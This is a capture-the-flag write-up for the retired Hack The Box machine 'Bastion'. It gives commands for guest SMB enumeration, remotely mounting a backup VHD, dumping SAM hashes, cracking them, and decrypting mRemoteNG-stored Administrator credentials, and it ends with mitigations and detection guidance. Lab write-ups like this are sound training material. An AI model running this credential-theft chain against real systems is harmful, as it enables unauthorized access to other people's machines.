---
machine: Bastion
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, smb, vhd, sam, mremoteng, cve]
---

# Bastion — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Windows Server 2016 in WORKGROUP, not domain-joined. SMB allows guests and shares `Backups` with a Windows Image Backup: two VHDs, one of them 5.4 GB. Instead of downloading it, mount it over SMB with `guestmount`, copy `SAM` and `SYSTEM`, and dump local hashes. `L4mpje`'s hash falls to rockyou and gives SSH. As a local admin, `mRemoteNG` is installed, and its stored passwords are encrypted with a **static key published by the project itself** (a design flaw, no CVE assigned) and decrypt with `mremoteng-decrypt`, leading to `Administrator`.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp    ssh     OpenSSH for Windows 7.9
135/tcp   msrpc
139/tcp   netbios-ssn
445/tcp   smb     Windows Server 2016 Standard 14393
5985/tcp  http    Microsoft HTTPAPI 2.0 (WinRM)
```

A standalone host, not domain-joined. `smb2-security-mode` shows signing not required and guest access enabled.

## Enumeration

```bash
smbclient -L //<IP> -N
smbmap -H <IP> -u guest -p ''
```

```text
Backups   READ      Backups
```

```bash
smbclient //<IP>/Backups -N
smb: \> recurse ON
smb: \> ls
```

```text
note.txt
WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\
   9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd   (37 MB)
   9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd   (5.4 GB)
```

`note.txt` warns against downloading the VHD because of its size. That is the hint: mount it remotely.

## Foothold

```bash
sudo mkdir -p /mnt/bastion /mnt/vhd
sudo mount -t cifs //<IP>/Backups /mnt/bastion -o guest,vers=2.0
sudo guestmount --add "/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" \
  --inspector --ro /mnt/vhd
```

With the disk mounted, the registry hives are one copy away:

```bash
cp /mnt/vhd/Windows/System32/config/SAM /tmp/SAM
cp /mnt/vhd/Windows/System32/config/SYSTEM /tmp/SYSTEM
secretsdump.py -sam /tmp/SAM -system /tmp/SYSTEM LOCAL
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:<hash>:::
```

`31d6cfe0d16ae931b73c59d7e0c089c0` is the empty-password hash: that account is disabled. Attack `L4mpje`:

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
ssh L4mpje@<IP>
```

## Escalation

```powershell
dir "C:\Program Files (x86)"
```

`mRemoteNG` stores connections in `%APPDATA%\mRemoteNG\confCons.xml`, with passwords base64-encoded and a default key (`mR3m`) when no master password is set:

```powershell
type "$env:APPDATA\mRemoteNG\confCons.xml"
```

```xml
<Node Name="DC" Username="Administrator" Password="<base64>" ... />
```

Decrypt:

```bash
python3 mremoteng_decrypt.py -s '<base64>'
# Administrator:<password>
```

```bash
ssh Administrator@<IP>
```

WinRM (5985) is open too, so `evil-winrm -u Administrator -p '<password>' -i <IP>` works as well.

## Evidence

- `whoami` → `bastion\l4mpje`, then `bastion\administrator`.
- `confCons.xml` with nodes and passwords redacted.
- `root.txt` read (redacted).

## Lessons learned

- Non-standard shares holding backups are the target: a backup is a whole disk, not just documents.
- A VHD never needs downloading: `guestmount --add` over CIFS mounts it read-only and saves 5 GB of traffic.
- The empty-password hash is recognisable on sight and saves time.
- `mRemoteNG` is a classic: hardcoded key, XML in the user profile, saved administrator credentials.
- Enumerating installed software pays more than hunting OS CVEs.

## Mitigations and detection

- Remove guest SMB access and do not expose backup shares.
- Encrypt backups and restrict them to service accounts; a VHD is a full disk including SAM.
- In `mRemoteNG`, require a master password, rotate stored credentials, and update past the hardcoded key.
- Disable SSH on Windows when unnecessary and restrict WinRM by network.
- Detection: access to `Backups` shares from uninventoried hosts, CIFS mounts of VHDs, reads of `confCons.xml`.
- MITRE: T1039 (data on shares), T1552.001 (credentials in files), T1555.

## References

- mRemoteNG static-key password storage (design flaw; no CVE).
- MITRE ATT&CK: T1039, T1552.001.
